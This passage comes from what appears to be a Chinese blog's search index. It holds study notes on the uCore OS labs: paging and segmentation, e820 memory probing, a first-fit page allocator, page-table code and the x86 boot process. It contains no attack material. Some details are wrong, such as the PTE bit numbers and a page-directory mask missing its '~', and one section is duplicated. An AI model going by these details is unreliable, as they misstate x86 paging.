这样，地址结构就由段号、段内页号和页内位移三部分组成。用于段页式地址变换的数据结构是每一个程序一张段表，每个段又建立一张页表，段表中的地址是页表的起始地址，而页表中的地址则为某页的物理页号，如图所示： 段页式管理中的段表、页表与内存的关系段页式地址变换中要得到物理地址须经过三次内存访问： 第一次访问段表，得到页表起始地址； 第二次访问页表，得到物理页号； 第三次将物理页号与页内位移组合，得到物理地址。 可用软、硬件相结合的方法实现段页式地址变换，这样虽然增加了硬件成本和系统开销，但提高了内存的利用率。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#段页式内存管理"},{"categories":["Pwning"],"content":"Linux 内存管理那么，Linux 操作系统采用了哪种方式来管理内存呢？ 在回答这个问题前，我们得先看看 Intel 处理器的发展历史。 早期 Intel 的处理器从 80286 开始使用的是段式内存管理。但是很快发现，光有段式内存管理而没有页式内存管理是不够的，这会使它的 X86 系列会失去市场的竞争力。因此，在不久以后的 80386 中就实现了对页式内存管理。也就是说，80386 除了完成并完善从 80286 开始的段式内存管理的同时还实现了页式内存管理。但是这个 80386 的页式内存管理设计时，没有绕开段式内存管理，而是建立在段式内存管理的基础上，这就意味着，**页式内存管理的作用是在由段式内存管理所映射而成的的地址上再加上一层地址映射。**由于此时段式内存管理映射而成的地址不再是“物理地址”了，Intel 就称之为“线性地址”（也称虚拟地址）。于是，段式内存管理先将逻辑地址映射成线性地址，然后再由页式内存管理将线性地址映射成物理地址。 Intel X86 逻辑地址解析过程这里说明下逻辑地址和线性地址： 程序所使用的地址，通常是没被段式内存管理映射的地址，称为逻辑地址； 通过段式内存管理映射的地址，称为线性地址，也叫虚拟地址； 逻辑地址是「段式内存管理」转换前的地址，线性地址则是「页式内存管理」转换前的地址。 Linux 内存主要采用的是页式内存管理，但同时也不可避免地涉及了段机制。这主要是上面 Intel 处理器发展历史导致的，因为 Intel X86 CPU 一律对程序中使用的地址先进行段式映射，然后才能进行页式映射。既然 CPU 的硬件结构是这样，Linux 内核也只好服从 Intel 的选择。但是事实上，Linux 内核所采取的办法是使段式映射的过程实际上不起什么作用。也就是说，“上有政策，下有对策”，若惹不起就躲着走。Linux 系统中的每个段都是从 0 地址开始的整个 4GB 虚拟空间（32 位环境下），也就是所有的段的起始地址都是一样的。这意味着，Linux 系统中的代码，包括操作系统本身的代码和应用程序代码，所面对的地址空间都是线性地址空间（虚拟地址），这种做法相当于屏蔽了处理器中的逻辑地址概念，段只被用于访问控制和内存保护。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#linux-内存管理"},{"categories":["Pwning"],"content":"Linux 的虚拟地址空间分布？在 Linux 操作系统中，虚拟地址空间的内部又被分为内核空间和用户空间两部分，不同位数的系统，地址空间的范围也不同。比如最常见的 32 位和 64 位系统，如下所示： 用户空间与内存空间通过这里可以看出： 32 位系统的内核空间占用 1G，位于最高处，剩下的 3G 是用户空间； 64 位系统的内核空间和用户空间都是 128T，分别占据整个内存空间的最高和最低处，剩下的中间部分是未定义的。 再来说说，内核空间与用户空间的区别： 进程在用户态时，只能访问用户空间内存； 只有进入内核态后，才可以访问内核空间的内存； 虽然每个进程都各自有独立的虚拟内存，但是每个虚拟内存中的内核地址，其实关联的都是相同的物理内存。这样，进程切换到内核态后，就可以很方便地访问内核空间内存。 每个进程的内核空间都是一致的接下来，进一步了解虚拟空间的划分情况，用户空间和内核空间划分的方式是不同的，内核空间的分布情况就不多说了。我们看看用户空间分布的情况，以 32 位系统为例： 虚拟内存空间划分通过这张图你可以看到，用户空间内存，从低到高分别是 7 种不同的内存段： 程序文件段，包括二进制可执行代码； 已初始化数据段，包括静态常量； 未初始化数据段，包括未初始化的静态变量； 堆段，包括动态分配的内存，从低地址开始向上增长； 文件映射段，包括动态库、共享内存等，从低地址开始向上增长（跟硬件和内核版本有关） 栈段，包括局部变量和函数调用的上下文等。栈的大小是固定的，一般是 8 MB。当然系统也提供了参数，以便我们自定义大小； 在这 7 个内存段中，堆和文件映射段的内存是动态分配的。比如说，使用 C 标准库的 malloc() 或者 mmap() ，就可以分别在堆和文件映射段动态分配内存。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:1","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#linux-的虚拟地址空间分布"},{"categories":["Pwning"],"content":"uCore物理内存探测当操作系统被启动之后，最重要的事情就是知道还有多少内存可用，一般来说，获取内存大小的方法由 BIOS 中断调用和直接探测两种。但BIOS 中断调用方法是一般只能在实模式下完成，而直接探测方法必须在保护模式下完成。通过 BIOS 中断获取内存布局有三种方式，都是基于int 15h中断，分别为88h, e801h, e820h。但是并非在所有情况下这三种方式都能工作。在 Linux kernel 里，采用的方法是依次尝试这三 种方法。而在本实验中，我们通过e820h中断获取内存信息。因为e820h中断必须在实模式下使用，所以我们在 bootloader 进入保护模式之前调用这个 BIOS 中断，并且把 e820 映射结构保存在物理地址0x8000处。 BIOS通过系统内存映射地址描述符（Address Range Descriptor）格式来表示系统物理内存布局，其具体表示如下： Offset Size Description 00h 8字节 base address #系统内存块基地址 08h 8字节 length in bytes #系统内存大小 10h 4字节 type of address range #内存类型 INT15h BIOS中断的详细调用参数: eax：e820h：INT 15的中断调用参数； edx：534D4150h (即4个ASCII字符“SMAP”) ，这只是一个签名而已； ebx：如果是第一次调用或内存区域扫描完毕，则为0。 如果不是，则存放上次调用之后的计数值； ecx：保存地址范围描述符的内存大小,应该大于等于20字节； es:di：指向保存地址范围描述符结构的缓冲区，BIOS把信息写入这个结构的起始地址。 此中断的返回值为: cflags的CF位：若INT 15中断执行成功，则不置位，否则置位； eax：534D4150h ('SMAP') ； es:di：指向保存地址范围描述符的缓冲区,此时缓冲区内的数据已由BIOS填写完毕 ebx：下一个地址范围描述符的计数地址 ecx：返回BIOS往ES:DI处写的地址范围描述符的字节大小 ah：失败时保存出错代码 这样，我们通过调用INT 15h BIOS中断，递增di的值（20的倍数），让BIOS帮我们查找出一个一个的内存布局entry，并放入到一个保存地址范围描述符结构的缓冲区中，供后续的ucore进一步进行物理内存管理。这个缓冲区结构定义在memlayout.h中： struct e820map { // e820 映射结构保存在物理地址0x8000处 int nr_map; // map中的元素个数 struct { uint64_t addr; // 内存块的起始地址 uint64_t size; // 内存块的大小 uint32_t type; // 内存块的类型，1标识可被使用内存块；2表示保留的内存块，不可映射。 } __attribute__((packed)) map[E820MAX]; }; 这样就在bootmain.S中新增了一段代码： probe_memory: movl $0, 0x8000 ;首先，设置`nr_map = 0` xorl %ebx, %ebx ;int 15h的参数，第一次调用置为0 movw $0x8004, %di ;rdi置为第一块map结构的起始地址 start_probe: movl $0xE820, %eax ;中断调用参数，赋值给eax movl $20, %ecx ;保存地址范围描述符的内存大小 movl $SMAP, %edx ;签名“SMAP” int $0x15 ;调用中断 jnc cont ;如果eflags的CF位为0，则表示还有内存段需要探测，如果该中断执行失败，则CF标志位会置1 movw $12345, 0x8000 ;探测有问题，向结构e820map中的成员nr_map中写入特殊信息，结束探测 jmp finish_probe cont: addw $20, %di ;如果中断执行正常，则目标写入地址就向后移动一个位置+20字节 incl 0x8000 ;`nr_map++` cmpl $0, %ebx ;执行中断后，返回的ebx是原先的ebx加一。如果ebx为0，则说明当前内存探测完成 jnz start_probe finish_probe: 上述代码正常执行完毕后，在0x8000地址处保存了从BIOS中获得的内存分布信息，此信息按照struct e820map的设置来进行填充。这部分信息将在bootloader启动ucore后，由ucore的page_init函数来根据struct e820map的memmap（定义了起始地址为0x8000）来完成对整个机器中的物理内存的总体管理。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#ucore物理内存探测"},{"categories":["Pwning"],"content":"uCore物理页管理在获得可用物理内存范围后，系统需要建立相应的数据结构来管理以物理页为最小单位的整个物理内存，以配合后续涉及的分页管理机制。每个物理页可以用一个 Page数据结构来表示。由于一个物理页需要占用一个Page结构的空间，Page结构在设计时须尽可能小，以减少对内存的占用。Page的定义在kern/mm/memlayout.h中。以页为单位的物理内存分配管理的实现在kern/default_pmm.[ch]。 为了与以后的分页机制配合，我们首先需要建立对整个计算机的每一个物理页的属性用结构Page来表示，它包含了映射此物理页的虚拟页个数，描述物理页属性的flags和双向链接各个Page结构的page_link双向链表。 struct Page { int ref; // page frame's reference counter uint32_t flags; // array of flags that describe the status of the page frame unsigned int property; // the num of free block, used in first fit pm manager list_entry_t page_link; // free list link }; ref表示这个页被页表的引用记数。如果这个页被页表引用了，即在某页表中有一个页表项设置了一个虚拟页到这个Page管理的物理页的映射关系，就会把Page的ref加一；反之，若页表项取消，即映射关系解除，就会把Page的ref减一。 flags表示此物理页的状态标记，进一步查看kern/mm/memlayout.h中的定义，可以看到： /* Flags describing the status of a page frame */ #define PG_reserved 0 // the page descriptor is reserved for kernel or unusable #define PG_property 1 // the member 'property' is valid 这表示flags目前用到了两个bit表示页目前具有的两种属性，bit 0表示此页是否被保留（reserved），如果是被保留的页，则bit 0会设置为1，且不能放到空闲页链表中，即这样的页不是空闲页，不能动态分配与释放。比如目前内核代码占用的空间就属于这样“被保留”的页。在本实验中，bit 1表示此页是否是free的，如果设置为1，表示这页是free的，可以被分配；如果设置为0，表示这页已经被分配出去了，不能再被二次分配。 在本实验中，Page数据结构的成员变量property用来记录某连续内存空闲块的大小（即地址连续的空闲页的个数）。这里需要注意的是用到此成员变量的这个Page比较特殊，是这个连续内存空闲块地址最小的一页（即头一页， Head Page）。连续内存空闲块利用这个页的成员变量property来记录在此块内的空闲页的个数。 为了有效地管理这些小连续内存空闲块。所有的连续内存空闲块可用一个双向链表管理起来，便于分配和释放，为此定义了一个free_area_t数据结构，包含了一个list_entry结构的双向链表指针和记录当前空闲页的个数的无符号整型变量nr_free。其中的链表指针指向了空闲的物理页。 /* free_area_t - maintains a doubly linked list to record free (unused) pages */ typedef struct { list_entry_t free_list; // the list header unsigned int nr_free; // # of free pages in this free list } free_area_t; 有了这两个数据结构，ucore就可以管理起来整个以页为单位的物理内存空间。接下来需要解决两个问题： 管理页级物理内存空间所需的Page结构的内存空间从哪里开始，占多大空间？ 空闲内存空间的起始地址在哪里？ 对于这两个问题，我们首先根据bootloader给出的内存布局信息找出最大的物理内存地址maxpa（定义在page_init函数中的局部变量），由于x86的起始物理内存地址为0，所以可以得知需要管理的物理页个数为 npage = maxpa / PGSIZE 这样，我们就可以预估出管理页级物理内存空间所需的Page结构的内存空间所需的内存大小为： sizeof(struct Page) * npage) 由于bootloader加载ucore的结束地址（用全局指针变量end记录）以上的空间没有被使用，所以我们可以把end按页大小为边界向上取整后，作为管理页级物理内存空间所需的Page结构的内存空间，记为： pages = (struct Page *)ROUNDUP((void *)end, PGSIZE); 为了简化起见，从地址0到地址pages+ sizeof(struct Page) * npage)结束的物理内存空间设定为已占用物理内存空间（起始0~640KB的空间是空闲的），地址pages+ sizeof(struct Page) * npage)以上的空间为空闲物理内存空间，这时的空闲空间起始地址为 uintptr_t freemem = PADDR((uintptr_t)pages + sizeof(struct Page) * npage); 为此我们需要把这两部分空间给标识出来。首先，对于所有物理空间，通过如下语句即可实现占用标记： for (i = 0; i \u003c npage; i ++) { SetPageReserved(pages + i); } 然后，根据探测到的空闲物理空间，通过如下语句即可实现空闲标记： //获得空闲空间的起始地址begin和结束地址end …… init_memmap(pa2page(begin), (end - begin) / PGSIZE); 其实SetPageReserved只需把物理地址对应的Page结构中的flags标志设置为PG_reserved ，表示这些页已经被使用了，将来不能被用于分配。而init_memmap函数则是把空闲物理页对应的Page结构中的flags和引用计数ref清零，并加到free_area.free_list指向的双向列表中，为将来的空闲页管理做好初始化准备工作。 其实实验二在内存分配和释放方面最主要的作用是建立了一个物理内存页管理器框架，这实际上是一个函数指针列表，定义如下： struct pmm_manager { const char *name; //物理内存页管理器的名字 void (*init)(void); //初始化内存管理器 void (*init_memmap)(struct Page *base, size_t n); //初始化管理空闲内存页的数据结构 struct Page *(*alloc_pages)(size_t n); //分配n个物理内存页 void (*free_pages)(struct Page *base, size_t n); //释放n个物理内存页 size_t (*nr_free_pages)(void); //返回当前剩余的空闲页数 void (*check)(void); //用于检测分配/释放实现是否正确的辅助函数 }; 重点是实现init_memmap/ alloc_pages/ free_pages这三个函数。当完成物理内存页管理初始化工作后，计算机系统的内存布局如下图所示： +----------------------+ \u003c- 0xFFFFFFFF(4GB) ---------------------------- 4GB | 一些保留内存，例如用于| 保留空间 | 32bit设备映射空间等 | +----------------------+ \u003c- 实际物理内存空间结束地址 ---------------------------- | | | | | 用于分配的 | 可用的空间 | 空闲内存区域 | | | | | | | +----------------------+ \u003c- 空闲内存起始地址 ---------------------------- | VPT页表存放位置 | VPT页表存放的空间 (4MB左右) +----------------------+ \u003c- bss段结束处 ---------------------------- |uCore的text、data、bss | uCore各段的空间 +----------------------+ \u003c- 0x00100000(1MB) ---------------------------- 1MB | BIOS ROM | +----------------------+ \u003c- 0x000F0000(960KB) | 16bit设备扩展ROM | 显存与其他ROM映射的空间 +----------------------+ \u003c- 0x000C0000(768KB) | CGA显存空间 | +----------------------+ \u003c- 0x000B8000 ---------------------------- 736KB | 空闲内存 | +------------","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#ucore物理页管理"},{"categories":["Pwning"],"content":"地址映射在uCore中地址映射的关系为 virt addr = linear addr = phy addr + 0xC0000000 在kernel.ld中 /* Load the kernel at this address: \".\" means the current address */ . = 0xC0100000; 可以看到kernel被加载到0xC0100000，这个地址是虚拟地址。转换为物理地址为0x100000。在lab1中，这里为 /* Load the kernel at this address: \".\" means the current address */ . = 0x100000; 最终的物理地址是一致的。 在lab2/kern/init/init.c的kern_init函数中，声明了外部全局变量： extern char edata[], end[]; 但搜寻所有源码文件*.[ch]，没有发现有这两个变量的定义。那这两个变量从哪里来的呢？其实在lab2/tools/kernel.ld中，可以看到如下内容： … .text : { *(.text .stub .text.* .gnu.linkonce.t.*) } … .data : { *(.data) } … PROVIDE(edata = .); … .bss : { *(.bss) } … PROVIDE(end = .); … 这里的“.”表示当前地址，“.text”表示代码段起始地址，“.data”也是一个地址，可以看出，它即代表了代码段的结束地址，也是数据段的起始地址。类推下去，“edata”表示数据段的结束地址，“.bss”表示数据段的结束地址和BSS段的起始地址，而“end”表示BSS段的结束地址。即整个kernel的结束地址。 edata[]和 end[]这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的结束地址，它们不在任何一个.S、.c或.h文件中定义，但仍然可以在源码文件中使用。 在uCore中采用的二级页表的方式进行内存管理，为把0~KERNSIZE（明确ucore设定实际物理内存不能超过KERNSIZE值，即0x38000000字节，896MB，3670016个物理页）的物理地址一一映射到页目录项和页表项的内容，其大致流程如下： 先通过alloc_page获得一个空闲物理页，用于页目录表； 调用boot_map_segment函数建立一一映射关系，具体处理过程以页为单位进行设置，即 virt addr = phy addr + 0xC0000000 设一个32bit线性地址la有一个对应的32bit物理地址pa，如果在以la的高10位为索引值的页目录项中的存在位（PTE_P）为0，表示缺少对应的页表空间，则可通过alloc_page获得一个空闲物理页给页表，页表起始物理地址是按4096字节对齐的，这样填写页目录项的内容为 页目录项内容 = (页表起始物理地址 \u00260x0FFF) | PTE_U | PTE_W | PTE_P 进一步对于页表中以线性地址la的中10位为索引值对应页表项的内容为 页表项内容 = (pa \u0026 ~0x0FFF) | PTE_P | PTE_W 其中： PTE_U：位3，表示用户态的软件可以读取对应地址的物理内存页内容 PTE_W：位2，表示物理内存页内容可写 PTE_P：位1，表示物理内存页存在 ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#地址映射"},{"categories":["Pwning"],"content":"Lab2","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#lab2"},{"categories":["Pwning"],"content":"练习1实现 first-fit 连续物理内存分配算法 Code:default_pmm.c static void default_init(void) { list_init(\u0026free_list); nr_free = 0; } free_list用来维护所有空闲的内存块，是一个空闲链表，在最开始它的prev和next都指向自身。nr_free记录了free_list中空闲page的数目。 static void default_init_memmap(struct Page *base, size_t n) { assert(n \u003e 0); struct Page *p = base; for (; p != base + n; p ++) { assert(PageReserved(p)); p-\u003eflags = p-\u003eproperty = 0; set_page_ref(p, 0); } base-\u003eproperty = n; SetPageProperty(base); nr_free += n; list_add(\u0026free_list, \u0026(base-\u003epage_link)); } default_init_memmap用来对块中的每个page进行初始化，并将block加入到free_list中。 在我们实现的first_fit算法中，要求block按照地址进行排序。而list_add中实现的是list_add_after(listelm, elm);，即在free_list后添加。所以，这里要改成list_add_before。 static struct Page * default_alloc_pages(size_t n) { assert(n \u003e 0); if (n \u003e nr_free) { return NULL; } struct Page *page = NULL; list_entry_t *le = \u0026free_list; while ((le = list_next(le)) != \u0026free_list) { struct Page *p = le2page(le, page_link); if (p-\u003eproperty \u003e= n) { page = p; break; } } if (page != NULL) { list_del(\u0026(page-\u003epage_link)); if (page-\u003eproperty \u003e n) { struct Page *p = page + n; p-\u003eproperty = page-\u003eproperty - n; list_add(\u0026free_list, \u0026(p-\u003epage_link)); } nr_free -= n; ClearPageProperty(page); } return page; } default_alloc_pages用来申请指定数目的空闲page。当n大于nr_free时，free_list必然不能满足需求，返回NULL。 之后遍历free_list，查看每一个page_header，其property记录了该链表中page的数目。找到第一个合适的返回。 如果找到了这样的block，则将其进行切割（如果必要的话），将剩余的再加入到链表中。 所以对应处改为: if (page != NULL) { if (page-\u003eproperty \u003e n) { struct Page *p = page + n; p-\u003eproperty = page-\u003eproperty - n; SetPageProperty(p); list_add_after(\u0026(page-\u003epage_link), \u0026(p-\u003epage_link)); } list_del(\u0026(page-\u003epage_link)); nr_free -= n; ClearPageProperty(page); } static void default_free_pages(struct Page *base, size_t n) { assert(n \u003e 0); struct Page *p = base; for (; p != base + n; p ++) { assert(!PageReserved(p) \u0026\u0026 !PageProperty(p)); p-\u003eflags = 0; set_page_ref(p, 0); } base-\u003eproperty = n; SetPageProperty(base); list_entry_t *le = list_next(\u0026free_list); while (le != \u0026free_list) { p = le2page(le, page_link); le = list_next(le); if (base + base-\u003eproperty == p) { base-\u003eproperty += p-\u003eproperty; ClearPageProperty(p); list_del(\u0026(p-\u003epage_link)); } else if (p + p-\u003eproperty == base) { p-\u003eproperty += base-\u003eproperty; ClearPageProperty(base); base = p; list_del(\u0026(p-\u003epage_link)); } } nr_free += n; list_add(\u0026free_list, \u0026(base-\u003epage_link)); } default_free_pages将被free的block重新加入到free_list中，并做了相应的合并操作。然而，在这个版本中，将合并后的block加入到了链表头部。 所以对应处改为： nr_free += n; for(le = list_next(le); le != \u0026free_list; le = list_next(le)) { p = le2page(le, page_link); if(base + base-\u003eproperty \u003c= p) { assert(base + base-\u003eproperty != p); break; } } list_add_before(\u0026(p-\u003epage_link), \u0026(base-\u003epage_link)); ","date":"2021-07-10","objectID":"/ucore-lab-2/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#练习1"},{"categories":["Pwning"],"content":"练习2 #if 1 // \u0026pgdir[PDX(la)] 根据一级页表项索引从一级页表中找到对应的页目录项指针 pde_t *pdep = \u0026pgdir[PDX(la)]; // (1) find page directory entry if (!(*pdep \u0026 PTE_P)) { // (2) check if entry is not present struct Page *page; if(!create || (page = alloc_page()) == NULL) // (3) check if creating is needed, then alloc page for page table return NULL; // CAUTION: this page is used for page table, not for common data page set_page_ref(page, 1); // (4) set page reference uintptr_t pa = page2pa(page); // (5) get linear address of page // 使用KADDR(pa)将物理地址转化为虚拟地址，使用`memset`进行清空 memset(KADDR(pa), 0, PGSIZE); // (6) clear page content using memset // 将对应的物理地址设置权限后填入二级页表 *pdep = pa | PTE_U | PTE_W | PTE_U; // (7) set page directory entry's permission } return \u0026((pte_t *)KADDR(PDE_ADDR(*pdep)))[PTX(la)]; // (8) return page table entry #endif get_pte给定一个虚拟地址，返回这个虚拟地址在二级页表中对应的项。 PTX(la)获得逻辑地址在二级页表中的下标。\u0026((pte_t *)KADDR(PDE_ADDR(*pdep)))获得la所对应的二级页表的内核虚拟地址，并将其转换为了二级页表表项指针。这样再通过下标，就可以获得对应的虚拟地址在二级页表中对应的项。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#练习2"},{"categories":["Pwning"],"content":"练习3释放某虚地址所在的页并取消对应二级页表项的映射 if(*ptep \u0026 PTE_P) { //(1) check if this page table entry is present struct Page *page = pte2page(*ptep); //(2) find corresponding page to pte if (page_ref_dec(page) == 0) { //(3) decrease page reference free_page(page); //(4) and free this page when page reference reachs 0 } *ptep = NULL; //(5) clear second page table entry tlb_invalidate(pgdir, la); //(6) flush tlb } page_remove_pte用来解除页的映射。如果该页的存在，清空该页的引用，并将其free。清空其二级页表项和对应的tlb。 对于每一个练习，其实都给了详细的注释，只要理解了概念，那代码不是问题。 ","date":"2021-07-10","objectID":"/ucore-lab-2/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#练习3"},{"categories":["Pwning"],"content":"Challenge 1: Buddy system","date":"2021-07-10","objectID":"/ucore-lab-2/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#challenge-1-buddy-system"},{"categories":["Pwning"],"content":"Challenge 2: Slub","date":"2021-07-10","objectID":"/ucore-lab-2/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#challenge-2-slub"},{"categories":["Pwning"],"content":"启动在CPU加电后，寄存器CS:IP被强制初始化为0xf000:0xfff0，此时CPU处于实模式，有20位地址线可用，可以访问1MB的地址空间，PC = 16*CS + IP。这时的地址也是真实的物理地址。 各个段寄存器和IP都是16位的。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#启动"},{"categories":["Pwning"],"content":"BIOS在这个位置是一个jmp far f000：e05b指令，它会让CPU跳转到BIOS程序的位置。接下来，BIOS就开始运行 BIOS实际上是被固化在计算机ROM（只读存储器）芯片上的一个特殊的软件，为上层软件提供最底层的、最直接的硬件控制与支持。更形象地说，BIOS就是PC计算机硬件与上层软件程序之间的一个\"桥梁\"，负责访问和控制硬件。它做了这些工作 硬件自检POST 检测系统中内存和显卡等关键部件的存在和工作状态 查找并执行显卡等接口卡BIOS，进行设备初始化 执行系统BIOS，进行系统检测 检测和配置系统中安装的即插即用设备 检测并初始化外设、在0x000-0x3ff建立数据结构，中断向量表IVT并填写中断例程。 更新CMOS中的扩展系统配置数据ESCD 按照指定启动顺序从软盘、硬盘和光驱启动 加载第一个扇区，MBR，将其512字节加载到内存中 跳转到0x7c00的第一条指令开始执行 ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#bios"},{"categories":["Pwning"],"content":"MBR（主引导记录）MBR（主引导记录），它固定在0盘0道1扇区。BIOS结束后，没有直接将CPU的控制权给操作系统，而是给了MBR。MBR知道操作系统被加载到了哪个分区，也会有多个操作系统需要你去选择加载哪一个。 MBR共512字节（一个扇区大小）包含 启动代码：446字节 检查分许表的正确性 加载并跳转到磁盘上的引导程序bootloder 当安装了多个操作系统时，需要选择加载哪个系统，MBR会跳转到对应的分区执行bootloader 硬盘分区表：64字节 描述分区状态和位置 每个分区描述信息占据16字节 结束标志(魔数)：0xaa55 主引导记录的有效标志 ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#mbr主引导记录"},{"categories":["Pwning"],"content":"加载程序（bootloader） 切换到保护模式，启用分段机制 从文件系统中读取启动配置信息（与操作系统有关） 各分区都有超级块，一般位于本分区的第2个扇区。超级块里面记录了此分区的信息，其中就有文件系统的魔数，一种文件系统对应一个魔数，通过比较即可得知文件系统类型。 对于uCore来说就是ELF格式 启动并显示菜单，可选系统内核列表和参数 依据选择的配置加载内核 之后，CPU就交给操作系统内核了。下面我们进一步看看bootloader的过程 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#加载程序bootloader"},{"categories":["Pwning"],"content":"保护模式的开启在进入保护模式前，要建立各段的映射关系，从而开启段机制。有关其内存管理的细节在lab2中。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#保护模式的开启"},{"categories":["Pwning"],"content":"建立段映射各段寄存器指向了不同段的基址，而在每个段的开始有段描述符。 段描述符 在分段存储管理机制的保护模式下，每个段由如下三个参数进行定义：段基地址(Base Address)、段界限(Limit)和段属性(Attributes) 段基地址：规定线性地址空间中段的起始地址。任何一个段都可以从32位线性地址空间中的任何一个字节开始，不用像实模式下规定边界必须被16整除。 段界限：规定段的大小。可以以字节为单位或以4K字节为单位。 段属性：确定段的各种性质。 段属性中的粒度位（Granularity），用符号G标记。G=0表示段界限以字节位位单位，20位的界限可表示的范围是1字节至1M字节，增量为1字节；G=1表示段界限以4K字节为单位，于是20位的界限可表示的范围是4K字节至4G字节，增量为4K字节。 类型（TYPE）：用于区别不同类型的描述符。可表示所描述的段是代码段还是数据段，所描述的段是否可读/写/执行，段的扩展方向等。其4bit从左到右分别是 执行位：置1时表示可执行，置0时表示不可执行； 一致位：置1时表示一致码段，置0时表示非一致码段； 读写位：置1时表示可读可写，置0时表示只读； 访问位：置1时表示已访问，置0时表示未访问。 描述符特权级（Descriptor Privilege Level）（DPL）：用来实现保护机制。 段存在位（Segment-Present bit）：如果这一位为0，则此描述符为非法的，不能被用来实现地址转换。如果一个非法描述符被加载进一个段寄存器，处理器会立即产生异常。操作系统可以任意的使用被标识为可用（AVAILABLE）的位。 已访问位（Accessed bit）：当处理器访问该段（当一个指向该段描述符的选择子被加载进一个段寄存器）时，将自动设置访问位。操作系统可清除该位。 段选择子在一个段寄存器中，会保存一块区域叫段选择子。 线性地址部分的选择子是用来选择哪个描述符表和在该表中索引哪个描述符的。选择子可以做为指针变量的一部分，从而对应用程序员是可见的，但是一般是由连接加载器来设置的。 段选择子结构 索引（Index）：高13位，在描述符表中从8192个描述符中选择一个描述符。处理器自动将这个索引值乘以8（描述符的长度），再加上描述符表的基址来索引描述符表，从而选出一个合适的描述符。 表指示位（Table Indicator，TI）：1位，选择应该访问哪一个描述符表。0代表应该访问全局描述符表（GDT），1代表应该访问局部描述符表（LDT）。 请求特权级（Requested Privilege Level，RPL）：低两位，保护机制。 由段选择子得到的段描述符，再得到段的基址，最后加上偏移就得到了一个线性地址。在未开启分页机制时，线性地址即为物理地址。 全局描述符表（GDT）我们需要一个大数组来管理那么多的段，这个数组我们称为全局描述符表（GDT），它保存了各段的段描述符，简称段表。 全局描述符表的起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#建立段映射"},{"categories":["Pwning"],"content":"建立段映射各段寄存器指向了不同段的基址，而在每个段的开始有段描述符。 段描述符 在分段存储管理机制的保护模式下，每个段由如下三个参数进行定义：段基地址(Base Address)、段界限(Limit)和段属性(Attributes) 段基地址：规定线性地址空间中段的起始地址。任何一个段都可以从32位线性地址空间中的任何一个字节开始，不用像实模式下规定边界必须被16整除。 段界限：规定段的大小。可以以字节为单位或以4K字节为单位。 段属性：确定段的各种性质。 段属性中的粒度位（Granularity），用符号G标记。G=0表示段界限以字节位位单位，20位的界限可表示的范围是1字节至1M字节，增量为1字节；G=1表示段界限以4K字节为单位，于是20位的界限可表示的范围是4K字节至4G字节，增量为4K字节。 类型（TYPE）：用于区别不同类型的描述符。可表示所描述的段是代码段还是数据段，所描述的段是否可读/写/执行，段的扩展方向等。其4bit从左到右分别是 执行位：置1时表示可执行，置0时表示不可执行； 一致位：置1时表示一致码段，置0时表示非一致码段； 读写位：置1时表示可读可写，置0时表示只读； 访问位：置1时表示已访问，置0时表示未访问。 描述符特权级（Descriptor Privilege Level）（DPL）：用来实现保护机制。 段存在位（Segment-Present bit）：如果这一位为0，则此描述符为非法的，不能被用来实现地址转换。如果一个非法描述符被加载进一个段寄存器，处理器会立即产生异常。操作系统可以任意的使用被标识为可用（AVAILABLE）的位。 已访问位（Accessed bit）：当处理器访问该段（当一个指向该段描述符的选择子被加载进一个段寄存器）时，将自动设置访问位。操作系统可清除该位。 段选择子在一个段寄存器中，会保存一块区域叫段选择子。 线性地址部分的选择子是用来选择哪个描述符表和在该表中索引哪个描述符的。选择子可以做为指针变量的一部分，从而对应用程序员是可见的，但是一般是由连接加载器来设置的。 段选择子结构 索引（Index）：高13位，在描述符表中从8192个描述符中选择一个描述符。处理器自动将这个索引值乘以8（描述符的长度），再加上描述符表的基址来索引描述符表，从而选出一个合适的描述符。 表指示位（Table Indicator，TI）：1位，选择应该访问哪一个描述符表。0代表应该访问全局描述符表（GDT），1代表应该访问局部描述符表（LDT）。 请求特权级（Requested Privilege Level，RPL）：低两位，保护机制。 由段选择子得到的段描述符，再得到段的基址，最后加上偏移就得到了一个线性地址。在未开启分页机制时，线性地址即为物理地址。 